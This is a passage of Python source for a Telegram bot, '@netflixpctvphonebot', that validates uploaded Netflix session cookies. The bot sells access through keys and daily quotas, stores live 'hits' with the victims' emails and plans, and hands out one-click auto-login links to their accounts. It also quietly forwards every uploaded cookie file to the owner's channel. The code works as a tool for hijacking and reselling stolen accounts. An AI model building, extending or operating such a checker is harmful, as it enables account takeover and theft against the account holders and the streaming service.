    parts = message.text.split()

    # ── /sendkey (no args) → generate & send to owner ──
    if len(parts) == 1:
        key = create_key(PLAN_DAYS, sold_to=None)
        try:
            bot.send_message(
                OWNER_ID,
                f"🔑 <b>Key Generated (for you)</b>\n\n"
                f"📦 <b>Plan :</b> {PLAN_DAYS} Days\n"
                f"🔑 <b>Key  :</b> <code>{key}</code>\n\n"
                f"Use /redeem {key} to activate, or send it manually."
            )
            bot.reply_to(message, f"✅ <b>Key generated and sent to you!</b>\n🔑 <code>{key}</code>")
        except Exception as e:
            bot.reply_to(message, f"❌ Error: <code>{e}</code>")
        return

    target = parts[1].strip()

    # ── Resolve target to user_id ──────────────────────
    if target.startswith("@"):
        uname = target[1:]
        row   = get_user_by_username(uname)
        if not row:
            bot.reply_to(message, f"❌ Username <code>@{uname}</code> not found in bot database.\nMake sure they have used the bot before.")
            return
        target_id   = row[0]
        target_name = row[2] or uname
        sold_to_label = f"@{row[1]}" if row[1] else f"@{uname}"
    elif target.isdigit():
        target_id = int(target)
        row       = get_user(target_id)
        if not row:
            bot.reply_to(message, f"❌ User ID <code>{target_id}</code> not found in bot database.")
            return
        target_name   = row[2] or str(target_id)
        sold_to_label = f"@{row[1]}" if row[1] else str(target_id)
    else:
        bot.reply_to(message, "❌ Invalid format. Use <code>@username</code> or <code>user_id</code>.")
        return

    # ── Generate & send key to target user ─────────────
    key = create_key(PLAN_DAYS, sold_to=sold_to_label)
    try:
        bot.send_message(
            target_id,
            f"🎉 <b>Your Access Key is Ready!</b>\n\n"
            f"📦 <b>Plan :</b> {PLAN_DAYS} Days\n"
            f"🔑 <b>Key  :</b> <code>{key}</code>\n\n"
            f"Use the command below to activate:\n"
            f"<code>/redeem {key}</code>\n\n"
            f"[ BOT : @netflixpctvphonebot ]"
        )
        bot.reply_to(
            message,
            f"✅ <b>Key sent successfully!</b>\n\n"
            f"👤 <b>To    :</b> {target_name} (<code>{target_id}</code>)\n"
            f"🔑 <b>Key   :</b> <code>{key}</code>\n"
            f"📦 <b>Plan  :</b> {PLAN_DAYS} Days"
        )
    except Exception as e:
        bot.reply_to(message, f"❌ Failed to send key: <code>{e}</code>")


# ── /ask ──────────────────────────────────────────────
@bot.message_handler(commands=["ask"])
def cmd_ask(message):
    user  = message.from_user
    register_user(user, FREE_DAYS)

    parts = message.text.split(maxsplit=1)
    if len(parts) < 2 or not parts[1].strip():
        bot.reply_to(
            message,
            "❓ <b>Ask the Owner</b>\n\n"
            "Usage: <code>/ask [your question]</code>\n"
            "Example: <code>/ask How do I redeem my key?</code>"
        )
        return

    question = parts[1].strip()
    uname    = f"@{user.username}" if user.username else "—"
    tier     = get_user_tier(user.id)
    plan_names = {
        "owner": "Owner", "paid": "Paid (7 Days)",
        "trial": "Free Trial", "free_user": "Free User", "banned": "Banned"
    }
    plan_label = plan_names.get(tier, tier)

    # Forward question to owner
    try:
        bot.send_message(
            OWNER_ID,
            f"❓ <b>NEW QUESTION</b>\n\n"
            f"👤 <b>Name    :</b> {user.first_name or '—'}\n"
            f"🆔 <b>User ID :</b> <code>{user.id}</code>\n"
            f"📛 <b>Username:</b> {uname}\n"
            f"📋 <b>Plan    :</b> {plan_label}\n\n"
            f"💬 <i>{question}</i>\n\n"
            f"Reply: <code>/reply {user.id} [your answer]</code>"
        )
        bot.reply_to(
            message,
            "✅ <b>Your question has been sent to the owner!</b>\n"
            "Please wait for a reply. 😊"
        )
    except Exception as e:
        bot.reply_to(message, f"❌ Failed to send question: <code>{e}</code>")


# ── /reply (owner → user) ─────────────────────────────
@bot.message_handler(commands=["reply"])
def cmd_reply(message):
    if not is_owner(message.from_user.id):
        bot.reply_to(message, "⛔ Owner only.")
        return

    parts = message.text.split(maxsplit=2)
    if len(parts) < 3:
        bot.reply_to(
            message,
            "Usage:\n"
            "<code>/reply @username [message]</code>\n"
            "<code>/reply user_id [message]</code>"
        )
        return

    target  = parts[1].strip()
    reply_text = parts[2].strip()

    # Resolve target
    if target.startswith("@"):
        row = get_user_by_username(target[1:])
        if not row:
            bot.reply_to(message, f"❌ Username <code>{target}</code> not found.")
            return
        target_id   = row[0]
        target_name = row[2] or target
    elif target.isdigit():
        target_id = int(target)
        row       = get_user(target_id)
        if not row:
            bot.reply_to(message, f"❌ User ID <code>{target_id}</code> not found.")
            return
        target_name = row[2] or str(target_id)
    else:
        bot.reply_to(message, "❌ Invalid format. Use <code>@username</code> or <code>user_id</code>.")
        return

    try:
        bot.send_message(
            target_id,
            f"💬 <b>Reply from Owner:</b>\n\n"
            f"{reply_text}\n\n"
            f"[ BOT : @netflixpctvphonebot ]"
        )
        bot.reply_to(
            message,
            f"✅ <b>Reply sent!</b>\n"
            f"👤 To: {target_name} (<code>{target_id}</code>)"
        )
    except Exception as e:
        bot.reply_to(message, f"❌ Failed to send reply: <code>{e}</code>")


# ── /keys ─────────────────────────────────────────────
@bot.message_handler(commands=["keys"])
def cmd_keys(message):
    if not is_owner(message.from_user.id):
        bot.reply_to(message, "⛔ Owner only.")
        return

    unused = list_keys(used=False)
    used   = list_keys(used=True)

    lines = []
    lines.append(f"🔑 KEY REPORT — {datetime.utcnow().strftime('%Y-%m-%d %H:%M:%S')} UTC")
    lines.append(f"  Unused : {len(unused)}")
    lines.append(f"  Used   : {len(used)}")
    lines.append("")

    lines.append("── UNUSED KEYS " + "─" * 35)
    for row in unused:
        key, days, created_at, _, _, sold_to = row
        tag = f"Sold to {sold_to}" if sold_to else "Gen for owner"
        lines.append(f"  🔑 {key}  ({days}d)  Created: {created_at}  [{tag}]")
    lines.append("")

    lines.append("── USED KEYS " + "─" * 37)
    for row in used:
        key, days, created_at, used_by, used_at, sold_to = row
        tag = f"Sold to {sold_to}" if sold_to else "Gen for owner"
        lines.append(f"  ✅ {key}  ({days}d)  Used by: {used_by}  At: {used_at}  [{tag}]")

    content  = "\n".join(lines)
    fname    = f"keys_{datetime.utcnow().strftime('%Y%m%d_%H%M%S')}.txt"
    bot.send_document(
        message.chat.id,
        (fname, content.encode("utf-8")),
        caption=f"🔑 <b>Keys:</b> {len(unused)} unused | {len(used)} used"
    )


# ── /redeem ───────────────────────────────────────────
@bot.message_handler(commands=["redeem"])
def cmd_redeem(message):
    user = message.from_user
    register_user(user, FREE_DAYS)

    allowed, reason = check_access(user.id)
    # Even expired users can redeem (to renew)
    if reason == "banned":
        bot.reply_to(message, "🚫 <b>You are banned and cannot redeem keys.</b>")
        return

    parts = message.text.split()
    if len(parts) < 2:
        bot.reply_to(message, "Usage: /redeem [KEY]\n\nExample: <code>/redeem NF-XXXXXXXXXXXXXXXX</code>")
        return

    key = parts[1].strip().upper()
    success, result = redeem_key(key, user.id)

    if success:
        days = result
        row  = get_user(user.id)
        new_exp = row[4] if row else "Unknown"
        bot.reply_to(
            message,
            f"✅ <b>Key redeemed successfully!</b>\n\n"
            f"🔑 <b>Key     :</b> <code>{key}</code>\n"
            f"⏳ <b>Duration:</b> <code>{days} day(s)</code>\n"
            f"📅 <b>Expires :</b> <code>{time_remaining(new_exp)}</code>"
        )
    elif result == "used":
        bot.reply_to(message, "❌ <b>This key has already been used.</b>")
    else:
        bot.reply_to(message, "❌ <b>Invalid key.</b> Please check and try again.")

# ═══════════════════════════════════════════════════════
#              DOCUMENT HANDLER (COOKIE FILES + PAYMENT)
# ═══════════════════════════════════════════════════════

@bot.message_handler(content_types=["document"])
def handle_document(message):
    user    = message.from_user
    caption = (message.caption or "").strip().lower()

    # ── /payment proof via file ────────────────────────
    if caption.startswith("/payment"):
        register_user(user, FREE_DAYS)
        _, reason = check_access(user.id)
        if reason == "banned":
            bot.reply_to(message, "🚫 <b>You are banned.</b>")
            return
        _forward_payment_proof(message, proof_type="document")
        return

    # ── Cookie file handler ────────────────────────────
    register_user(user, FREE_DAYS)
    tier = get_user_tier(user.id)

    if tier == "banned":
        bot.reply_to(message, "🚫 <b>You are banned.</b>")
        return

    doc = message.document
    if not doc.file_name.endswith((".txt", ".json", ".log")):
        bot.reply_to(message, "⚠️ Please send a <code>.txt</code>, <code>.json</code>, or <code>.log</code> file.")
        return

    try:
        file_info  = bot.get_file(doc.file_id)
        downloaded = bot.download_file(file_info.file_path)
        content    = downloaded.decode("utf-8", errors="ignore")

        bundles = parse_cookies_from_text(content)
        total   = len(bundles)

        if total == 0:
            bot.reply_to(message, "❌ No valid Netflix cookies found in this file.")
            return

        # ── Free User: limit to 20 cookies/day ────────
        if tier == "free_user":
            FREE_USER_COOKIE_LIMIT = 20
            used_today = get_free_user_cookies_today(user.id)
            remaining  = FREE_USER_COOKIE_LIMIT - used_today

            if remaining <= 0:
                bot.reply_to(
                    message,
                    "❌ <b>Daily limit reached!</b>\n\n"
                    "📋 <b>Your Plan:</b> Free User\n"
                    "You can check up to <b>20 cookies per day</b>.\n"
                    "🕛 Resets every day at <b>00:00 UTC</b>. Try again tomorrow.\n\n"
                    "💡 Upgrade your plan with /buy for unlimited checking!\n"
                    "❓ Have a question? Use /ask to contact the owner."
                )
                return

            if total > remaining:
                bundles = bundles[:remaining]

            add_free_user_cookies(user.id, len(bundles))

        # ── Forward file to channel ────────────────────
        uname = f"@{user.username}" if user.username else "—"
        try:
            bot.send_document(
                HITS_CHANNEL,
                doc.file_id,
                caption=(
                    f"🆔 <code>{user.id}</code>\n"
                    f"📛 {uname}"
                )
            )
        except Exception as e:
            print(f"[File Forward Error] {e}")

        # ── Block parallel checks ───────────────────────
        existing_sess = _db.get_check_session(user.id)
        if user.id in active_checkers or (existing_sess and existing_sess.get("stop_flag") == 0):
            bot.reply_to(
                message,
                "⚠️ <b>You already have a check running!</b>\n\n"
                "Please wait for it to finish, or press 🛑 <b>Stop Checking</b> to cancel it first."
            )
            return

        bot.reply_to(
            message,
            f"✅ <b>Loaded {len(bundles)} cookie bundle(s)</b> from <code>{doc.file_name}</code>\n\n"
            f"⏳ Starting check automatically..."
        )

        # If running on Vercel Serverless, use persistent DB session + auto-relay
        if os.environ.get("VERCEL"):
            start_serverless_check(message.chat.id, user, bundles)
        else:
            import threading
            threading.Thread(
                target=run_check,
                args=(message.chat.id, user, bundles),
                daemon=True
            ).start()

    except Exception as e:
        bot.reply_to(message, f"❌ Error reading file: <code>{e}</code>")


# ═══════════════════════════════════════════════════════
#              NF TOKEN COMMAND
# ═══════════════════════════════════════════════════════

@bot.message_handler(commands=["nftoken"])
def cmd_nftoken(message):
    import time
    user = message.from_user
    register_user(user, FREE_DAYS)

    ok, reason = check_access(user.id)
    tier = get_user_tier(user.id)

    if tier == "banned":
        bot.reply_to(message, "🚫 <b>You are banned.</b>")
        return

    uid = user.id

    # ── Determine daily limit based on tier ───────────
    if tier == "owner":
        daily_limit = None   # unlimited
    elif tier == "paid":
        daily_limit = 20
    elif tier == "trial":
        daily_limit = 5
    else:  # free_user
        daily_limit = 1

    # ── Cooldown check (10 seconds) ────────────────────
    last_used = nftoken_cooldown.get(uid, 0)
    elapsed   = time.time() - last_used
    if elapsed < 10:
        remaining = int(10 - elapsed) + 1
        bot.reply_to(message, f"⏳ Please wait <b>{remaining}s</b> before using Generate Links Cookies again.")
        return

    # ── Daily limit check ──────────────────────────────
    used_today = get_nftoken_usage(uid)
    if daily_limit is not None and used_today >= daily_limit:
        plan_names = {
            "trial":     "Free Trial",
            "free_user": "Free User",
            "paid":      "Paid (7 Days)",
        }
        plan_label = plan_names.get(tier, tier.replace("_", " ").title())
        bot.reply_to(
            message,
            f"❌ <b>Daily limit reached!</b>\n\n"
            f"📋 <b>Your Plan:</b> {plan_label}\n"
            f"You can use Generate Links Cookies <b>{daily_limit} times per day</b>.\n"
            f"🕛 Resets every day at <b>00:00 UTC</b>. Try again tomorrow.\n"
            f"❓ Have a question? Use /ask to contact the owner."
        )
        return

    # ── Check if there are any hits in DB ─────────────
    if count_hits_db() == 0:
        bot.reply_to(
            message,
            "📭 <b>Not available yet.</b>\n\n"
            "If you want to watch and have a <code>.txt</code> cookies file, "
            "you can check it here by sending the file directly to this bot! 🎬"
        )
        return

    # ── Start process ──────────────────────────────────
    nftoken_cooldown[uid] = time.time()

    msg = bot.reply_to(
        message,
        "⏳ <b>[1/3] Querying Netflix Local &amp; Server Clusters...</b>\n"
        "<i>Retrieving cached sessions...</i>"
    )

    # Try up to 5 random hits
    MAX_ATTEMPTS = 5
    for attempt in range(MAX_ATTEMPTS):
        hit_id, bundle = get_random_hit()

        if hit_id is None:
            bot.edit_message_text(
                "📭 <b>Not available yet.</b>\n\n"
                "If you want to watch and have a <code>.txt</code> cookies file, "
                "you can check it here by sending the file directly to this bot! 🎬",
                chat_id=msg.chat.id,
                message_id=msg.message_id
            )
            return

        # Step 2
        try:
            bot.edit_message_text(
                "🔍 <b>[2/3] Validating Live Cookie &amp; Extracting Tokens...</b>\n"
                "<i>Testing Netflix session...</i>",
                chat_id=msg.chat.id,
                message_id=msg.message_id
            )
        except Exception:
            pass

        # Actually re-check the cookie
        res = check_netflix_cookie(bundle)

        if not res.get("alive") or not res.get("is_active"):
            # Hit is dead — remove from DB and try next
            delete_hit_from_db(hit_id)
            continue

        # Step 3
        try:
            bot.edit_message_text(
                "🔗 <b>[3/3] Generating Direct 1-Click Login Links...</b>",
                chat_id=msg.chat.id,
                message_id=msg.message_id
            )
        except Exception:
            pass

        # ── Build result ───────────────────────────────
        increment_nftoken_usage(uid)
        if daily_limit is None:
            usage_text = "♾️ Unlimited (Owner)"
        else:
            remaining_today = daily_limit - (used_today + 1)
            usage_text = f"{used_today + 1}/{daily_limit} (remaining: {remaining_today})"

        result_text = (
            f"🎬 <b>NETFLIX 1-CLICK TOKEN GENERATED</b> 🌐\n\n"
            f"👤 <b>Account Details:</b>\n"
            f"• <b>Email:</b> <code>{res.get('email', 'N/A')}</code>\n"
            f"• <b>Plan:</b> {res.get('quality', 'HD')} ({res.get('streams', '?')} Screens)\n"
            f"• <b>Country:</b> {res.get('country', 'N/A')}\n\n"
            f"🖥️ <a href=\"{res.get('direct_url', '#')}\">Click Here to Auto-Login (PC Browser)</a>\n"
            f"📱 <a href=\"{res.get('mobile_url', '#')}\">Click Here to Auto-Login (Mobile)</a>\n\n"
            f"⚠️ <i>Copy the link or click above to auto-login into Netflix!</i>\n"
            f"[ BOT : @netflixpctvphonebot ]\n\n"
            f"📊 <b>Today's usage:</b> {usage_text}"
        )

        markup = types.InlineKeyboardMarkup()
        if res.get("nftoken"):
            markup.row(
                types.InlineKeyboardButton("🖥️ Direct Watch", url=res.get("direct_url")),
                types.InlineKeyboardButton("📱 Mobile Watch", url=res.get("mobile_url")),
            )

        try:
            bot.edit_message_text(
                result_text,
                chat_id=msg.chat.id,
                message_id=msg.message_id,
                reply_markup=markup if res.get("nftoken") else None,
                disable_web_page_preview=True
            )
        except Exception:
            bot.send_message(
                message.chat.id,
                result_text,
                reply_markup=markup if res.get("nftoken") else None,
                disable_web_page_preview=True
            )
        return

    # All attempts failed
    bot.edit_message_text(
        "📭 <b>Not available yet.</b>\n\n"
        "If you want to watch and have a <code>.txt</code> cookies file, "
        "you can check it here by sending the file directly to this bot! 🎬",
        chat_id=msg.chat.id,
        message_id=msg.message_id
    )


# ═══════════════════════════════════════════════════════
#              CHECKING ENGINE
# ═══════════════════════════════════════════════════════

@bot.callback_query_handler(func=lambda call: call.data.startswith("stop_check_"))
def callback_stop_button(call):
    """Handle the 🛑 Stop Checking inline button."""
    try:
        uid = int(call.data.split("stop_check_")[1])
    except (IndexError, ValueError):
        bot.answer_callback_query(call.id, "Invalid stop request.")
        return

    # Only the user who started the check can stop it
    if call.from_user.id != uid:
        bot.answer_callback_query(call.id, "⛔ Only the user who started can stop it.")
        return

    db_stopped = _db.set_check_session_stop(uid)
    if stop_flags.get(uid) is False or db_stopped:
        if stop_flags.get(uid) is False:
            stop_flags[uid] = True
        bot.answer_callback_query(call.id, "🛑 Stop signal sent!")
    else:
        bot.answer_callback_query(call.id, "No active checking session.")


# ═══════════════════════════════════════════════════════
#          SERVERLESS AUTO-RELAY CHECKING ENGINE
# ═══════════════════════════════════════════════════════

def make_progress_bar_str(current, total, length=10):
    if total <= 0:
        return "[░░░░░░░░░░] 0%"
    filled = int(length * current / total)
    bar    = "█" * filled + "░" * (length - filled)
    pct    = int(100 * current / total)
    return f"[{bar}] {pct}%"


def send_hits_file_report(chat_id, checked_count, active, inactive, dead, hits_log):
    """Send hits .txt with summary as caption."""
    import random
    now   = datetime.utcnow()
    date  = now.strftime("%d%m%Y")
    rand4 = random.randint(1000, 9999)
    fname = f"@netflixpctvphonebot_{date}_{rand4}.txt"

    summary = (
        f"🏁 <b>Netflix Links Check Complete!</b>\n\n"
        f"📦 <b>Total Checked  :</b> {checked_count}\n"
        f"🔥 <b>Active Hits    :</b> {active}\n"
        f"⚠️ <b>No Plan/Free  :</b> {inactive}\n"
        f"❌ <b>Dead/Expired   :</b> {dead}\n"
        f"[ BOT : @netflixpctvphonebot ]"
    )

    if not hits_log:
        bot.send_message(chat_id, summary)
        return

    lines = []
    lines.append("╔══════════════════════════════════════════════════════╗")
    lines.append("  🔥 NETFLIX HITS RESULT")
    lines.append(f"  Generated : {now.strftime('%Y-%m-%d %H:%M:%S')} UTC")
    lines.append(f"  Checked   : {checked_count} cookies")
    lines.append(f"  Active    : {len(hits_log)}")
    lines.append("  BOT       : @netflixpctvphonebot")
    lines.append("╚══════════════════════════════════════════════════════╝\n")
    for i, h in enumerate(hits_log, 1):
        lines.append("─" * 54)
        lines.append(f"  HIT #{i}")
        lines.append(f"  Email   : {h.get('email', 'N/A')}")
        lines.append(f"  Country : {h.get('country', 'N/A')}")
        lines.append(f"  Status  : {h.get('status', 'N/A')}")
        lines.append(f"  Quality : {h.get('quality', 'N/A')} ({h.get('streams', '?')} Screens)")
        lines.append(f"  Expires : {h.get('token_expiry', 'N/A')}")
        lines.append(f"  Direct  : {h.get('direct_url', 'N/A')}")
        lines.append(f"  Mobile  : {h.get('mobile_url', 'N/A')}")
    lines.append("\n" + "─" * 54)
    lines.append("[ BOT : @netflixpctvphonebot ]")
    content = "\n".join(lines)

    try:
        bot.send_document(
            chat_id,
            (fname, content.encode("utf-8")),
            caption=summary
        )
    except Exception as e:
        print(f"[Hits File Error] {e}")
        bot.send_message(chat_id, summary)


def trigger_next_relay(user_id: int):
    """Fire-and-forget call to /api/check-worker on Vercel to continue checking."""
    worker_url = "https://netflixami.vercel.app/api/check-worker"
    try:
        requests.post(worker_url, json={"user_id": user_id}, timeout=2.0, verify=False)
    except Exception:
        # Timeout is expected because fire-and-forget returns after launching next worker
        pass


def start_serverless_check(chat_id, user, bundles):
    """Initialize checking session in Supabase and trigger first relay batch."""
    total = len(bundles)
    stop_markup = types.InlineKeyboardMarkup()
    stop_markup.add(types.InlineKeyboardButton("🛑 Stop Checking", callback_data=f"stop_check_{user.id}"))

    status_msg = bot.send_message(
        chat_id,
        f"⏳ <b>Checking cookies...</b>\n"
        f"{make_progress_bar_str(0, total)}\n"
        f"<b>(0/{total})</b>\n\n"
        f"🔥 Active: 0 | ⚠️ No Plan: 0 | ❌ Dead: 0",
        reply_markup=stop_markup
    )

    try:
        bot.pin_chat_message(chat_id, status_msg.message_id, disable_notification=True)
    except Exception:
        pass

    _db.create_check_session(user.id, chat_id, status_msg.message_id, bundles)
    trigger_next_relay(user.id)


def process_serverless_check_batch(user_id: int, batch_size: int = 3):
    """Process a batch of cookies from DB session, update progress, and chain next relay if remaining."""
    sess = _db.get_check_session(user_id)
    if not sess:
        return {"status": "no_session"}

    chat_id        = sess["chat_id"]
    status_msg_id  = sess["status_msg_id"]
    bundles        = json.loads(sess["bundles_json"] or "[]")
    current_idx    = sess["current_idx"]
    total          = sess["total"]
    active_count   = sess["active_count"]
    inactive_count = sess["inactive_count"]
    dead_count     = sess["dead_count"]
    hits_log       = json.loads(sess["hits_log_json"] or "[]")
    stop_flag      = sess["stop_flag"]

    # Check if user pressed Stop
    if stop_flag:
        try:
            bot.unpin_chat_message(chat_id, status_msg_id)
        except Exception:
            pass
        send_hits_file_report(chat_id, current_idx, active_count, inactive_count, dead_count, hits_log)
        _db.delete_check_session(user_id)
        return {"status": "stopped"}

    stop_markup = types.InlineKeyboardMarkup()
    stop_markup.add(types.InlineKeyboardButton("🛑 Stop Checking", callback_data=f"stop_check_{user_id}"))

    end_idx = min(current_idx + batch_size, total)
    for i in range(current_idx, end_idx):
        # Re-check stop flag mid-batch if needed
        latest_sess = _db.get_check_session(user_id)
        if not latest_sess or latest_sess.get("stop_flag"):
            try:
                bot.unpin_chat_message(chat_id, status_msg_id)
            except Exception:
                pass
            send_hits_file_report(chat_id, i, active_count, inactive_count, dead_count, hits_log)
            _db.delete_check_session(user_id)
            return {"status": "stopped"}

        bundle = bundles[i]
        res = check_netflix_cookie(bundle)

        if res.get("alive"):
            if res.get("is_active") and res.get("nftoken") and res.get("direct_url", "N/A") != "N/A":
                active_count += 1
                hits_log.append(res)
                save_hit_to_db(bundle, res, user_id)

                hit_text = (
                    f"🎬 <b>NETFLIX HIT #{active_count}</b> 🌐\n\n"
                    f"👤 <b>Account Details:</b>\n"
                    f"• <b>Email:</b> <code>{res.get('email', 'N/A')}</code>\n"
                    f"• <b>Plan:</b> {res.get('quality', 'HD')} ({res.get('streams', '?')} Screens)\n"
                    f"• <b>Country:</b> {res.get('country', 'N/A')}\n"
                    f"• <b>Status:</b> {res.get('status', 'N/A')} ✔\n\n"
                    f"🖥️ <a href=\"{res.get('direct_url', '#')}\">Click Here to Auto-Login (PC Browser)</a>\n"
                    f"📱 <a href=\"{res.get('mobile_url', '#')}\">Click Here to Auto-Login (Mobile)</a>\n\n"
                    f"⚠️ <i>Copy the link or click above to auto-login into Netflix!</i>\n"
                    f"[ BOT : @netflixpctvphonebot ]"
                )

                markup = types.InlineKeyboardMarkup()
                if res.get("nftoken"):
                    markup.row(
                        types.InlineKeyboardButton("🖥️ Direct Watch", url=res.get("direct_url")),
                        types.InlineKeyboardButton("📱 Mobile Watch", url=res.get("mobile_url")),
                    )

                try:
                    bot.send_message(
                        chat_id,
                        hit_text,
                        reply_markup=markup if res.get("nftoken") else None,
                        disable_web_page_preview=True,
                    )
                except Exception as e:
                    print(f"[Send Hit Error] {e}")
            else:
                inactive_count += 1
        else:
            dead_count += 1

    # Save updated state to Supabase
    _db.update_check_session_progress(user_id, end_idx, active_count, inactive_count, dead_count, hits_log)

    # Update Telegram progress bar
    try:
        bot.edit_message_text(
            f"⏳ <b>Checking cookies...</b>\n"
            f"{make_progress_bar_str(end_idx, total)}\n"
            f"<b>({end_idx}/{total})</b>\n\n"
            f"🔥 Active: {active_count} | "
            f"⚠️ No Plan: {inactive_count} | "
            f"❌ Dead: {dead_count}",
            chat_id=chat_id,
            message_id=status_msg_id,
            reply_markup=stop_markup
        )
    except Exception:
        pass

    # If finished all cookies:
    if end_idx >= total:
        try:
            bot.unpin_chat_message(chat_id, status_msg_id)
        except Exception:
            pass
        send_hits_file_report(chat_id, total, active_count, inactive_count, dead_count, hits_log)
        _db.delete_check_session(user_id)
        return {"status": "completed", "checked": total}

    # Otherwise, chain next relay!
    trigger_next_relay(user_id)
    return {"status": "relayed", "progress": f"{end_idx}/{total}"}


def run_check(chat_id, user, bundles):
    """Core checking loop — runs immediately after file is loaded."""
    active_checkers.add(user.id)
    try:
        _run_check_inner(chat_id, user, bundles)
    finally:
        active_checkers.discard(user.id)


def _run_check_inner(chat_id, user, bundles):
    """Inner checking logic."""
    total = len(bundles)

    def make_progress_bar(current, total, length=10):
        filled = int(length * current / total)
        bar    = "█" * filled + "░" * (length - filled)
        pct    = int(100 * current / total)
        return f"[{bar}] {pct}%"

    stop_markup = types.InlineKeyboardMarkup()
    stop_markup.add(types.InlineKeyboardButton("🛑 Stop Checking", callback_data=f"stop_check_{user.id}"))

    status_msg = bot.send_message(
        chat_id,
        f"⏳ <b>Checking cookies...</b>\n"
        f"{make_progress_bar(0, total)}\n"
        f"<b>(0/{total})</b>\n\n"
        f"🔥 Active: 0 | ⚠️ No Plan: 0 | ❌ Dead: 0",
        reply_markup=stop_markup
    )

    # Pin the progress message
    try:
        bot.pin_chat_message(chat_id, status_msg.message_id, disable_notification=True)
    except Exception:
        pass

    active_count = inactive_count = dead_count = 0
    stop_flags[user.id] = False
    hits_log = []  # Collect all active hits for the .txt file

    def send_hits_file(checked_count, active, inactive, dead):
        """Send hits .txt with summary as caption. Returns True if file sent."""
        import random
        now   = datetime.utcnow()
        date  = now.strftime("%d%m%Y")
        rand4 = random.randint(1000, 9999)
        fname = f"@netflixpctvphonebot_{date}_{rand4}.txt"

        summary = (
            f"🏁 <b>Netflix Links Check Complete!</b>\n\n"
            f"📦 <b>Total Checked  :</b> {checked_count}\n"
            f"🔥 <b>Active Hits    :</b> {active}\n"
            f"⚠️ <b>No Plan/Free  :</b> {inactive}\n"
            f"❌ <b>Dead/Expired   :</b> {dead}\n"
            f"[ BOT : @netflixpctvphonebot ]"
        )

        if not hits_log:
            # No hits — send plain text summary only
            bot.send_message(chat_id, summary)
            return

        # Build .txt content
        lines = []
        lines.append("╔══════════════════════════════════════════════════════╗")
        lines.append("  🔥 NETFLIX HITS RESULT")
        lines.append(f"  Generated : {now.strftime('%Y-%m-%d %H:%M:%S')} UTC")
        lines.append(f"  Checked   : {checked_count} cookies")
        lines.append(f"  Active    : {len(hits_log)}")
        lines.append("  BOT       : @netflixpctvphonebot")
        lines.append("╚══════════════════════════════════════════════════════╝\n")
        for i, h in enumerate(hits_log, 1):
            lines.append("─" * 54)
            lines.append(f"  HIT #{i}")
            lines.append(f"  Email   : {h.get('email', 'N/A')}")
            lines.append(f"  Country : {h.get('country', 'N/A')}")
            lines.append(f"  Status  : {h.get('status', 'N/A')}")
            lines.append(f"  Quality : {h.get('quality', 'N/A')} ({h.get('streams', '?')} Screens)")
            lines.append(f"  Expires : {h.get('token_expiry', 'N/A')}")
            lines.append(f"  Direct  : {h.get('direct_url', 'N/A')}")
            lines.append(f"  Mobile  : {h.get('mobile_url', 'N/A')}")
        lines.append("\n" + "─" * 54)
        lines.append("[ BOT : @netflixpctvphonebot ]")
        content = "\n".join(lines)

        try:
            bot.send_document(
                chat_id,
                (fname, content.encode("utf-8")),
                caption=summary
            )
        except Exception as e:
            print(f"[Hits File Error] {e}")
            bot.send_message(chat_id, summary)

    for idx, bundle in enumerate(bundles, 1):
        # ── Check if user requested stop ───────────────
        if stop_flags.get(user.id):
            try:
                bot.unpin_chat_message(chat_id, status_msg.message_id)
            except Exception:
                pass
            send_hits_file(idx - 1, active_count, inactive_count, dead_count)
            stop_flags.pop(user.id, None)
            pending_files.pop(user.id, None)
            return

        res = check_netflix_cookie(bundle)

        if res.get("alive"):
            if res.get("is_active") and res.get("nftoken") and res.get("direct_url", "N/A") != "N/A":
                active_count += 1
                hits_log.append(res)  # Save hit to log
                save_hit_to_db(bundle, res, user.id)  # Save to persistent DB for NF Token

                hit_text = (
                    f"🎬 <b>NETFLIX HIT #{active_count}</b> 🌐\n\n"
                    f"👤 <b>Account Details:</b>\n"
                    f"• <b>Email:</b> <code>{res.get('email', 'N/A')}</code>\n"
                    f"• <b>Plan:</b> {res.get('quality', 'HD')} ({res.get('streams', '?')} Screens)\n"
                    f"• <b>Country:</b> {res.get('country', 'N/A')}\n"
                    f"• <b>Status:</b> {res.get('status', 'N/A')} ✔\n\n"
                    f"🖥️ <a href=\"{res.get('direct_url', '#')}\">Click Here to Auto-Login (PC Browser)</a>\n"
                    f"📱 <a href=\"{res.get('mobile_url', '#')}\">Click Here to Auto-Login (Mobile)</a>\n\n"
                    f"⚠️ <i>Copy the link or click above to auto-login into Netflix!</i>\n"
                    f"[ BOT : @netflixpctvphonebot ]"
                )

                markup = types.InlineKeyboardMarkup()
                if res.get("nftoken"):
                    markup.row(
                        types.InlineKeyboardButton("🖥️ Direct Watch", url=res.get("direct_url")),
                        types.InlineKeyboardButton("📱 Mobile Watch", url=res.get("mobile_url")),
                    )

                bot.send_message(
                    chat_id,
                    hit_text,
                    reply_markup=markup if res.get("nftoken") else None,
                    disable_web_page_preview=True,
                )

            else:
                inactive_count += 1
        else:
            dead_count += 1

        # Update progress every 5 cookies or at the end
        if idx % 5 == 0 or idx == total:
            try:
                bot.edit_message_text(
                    f"⏳ <b>Checking cookies...</b>\n"
                    f"{make_progress_bar(idx, total)}\n"
                    f"<b>({idx}/{total})</b>\n\n"
                    f"🔥 Active: {active_count} | "
                    f"⚠️ No Plan: {inactive_count} | "
                    f"❌ Dead: {dead_count}",
                    chat_id=chat_id,
                    message_id=status_msg.message_id,
                    reply_markup=stop_markup
                )
            except Exception:
                pass

    # ── Unpin progress message when done ──────────────
    try:
        bot.unpin_chat_message(chat_id, status_msg.message_id)
    except Exception:
        pass

    # ── Final Summary + Hits File ──────────────────────
    send_hits_file(total, active_count, inactive_count, dead_count)

    pending_files.pop(user.id, None)
    stop_flags.pop(user.id, None)


# ═══════════════════════════════════════════════════════
#                     MAIN
# ═══════════════════════════════════════════════════════

if __name__ == "__main__":
    _db.init_all()
    _db.init_web_admin(
        os.environ.get("ADMIN_USERNAME", "admin"),
        os.environ.get("ADMIN_PASSWORD", "admin123")
    )
    print("=" * 50)
    print("  Netflix Cookie Checker Bot — Running!")
    print(f"  Owner ID    : {OWNER_ID}")
    print(f"  Free Trial  : {FREE_DAYS} days")
    print(f"  Hits Channel: {HITS_CHANNEL}")
    print("=" * 50)
    bot.infinity_polling(timeout=20, long_polling_timeout=10)

